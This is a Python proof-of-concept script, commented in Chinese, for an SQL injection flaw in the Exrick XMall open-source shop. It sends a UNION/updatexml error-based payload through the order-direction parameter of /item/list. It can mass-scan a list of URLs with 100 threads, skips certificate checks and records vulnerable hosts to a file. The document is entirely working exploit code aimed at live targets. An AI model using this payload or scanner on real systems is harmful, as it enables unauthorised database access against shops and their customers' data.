# Exrick XMall 开源商城 SQL注入漏洞
import argparse
import sys
import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    # 定义横幅
    banner="""███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝
                        
    """
    print(banner)

def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="Exrick XMall 开源商城 SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target + payload_url
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Connection": "close",
    }
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        res1 = requests.get(url=target + payload_url, headers=header, timeout=10, verify=False, proxies=proxies)
        if res1.status_code == 200 and "XPATH syntax error" in res1.text:
            print(f"[+] 该url{target}存在 SQL 注入")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该url{target}不存在 SQL 注入")
    except Exception as e:
        print(f'[*] 该url{target}可能存在访问问题，请手工测试')

if __name__ == '__main__':
    main()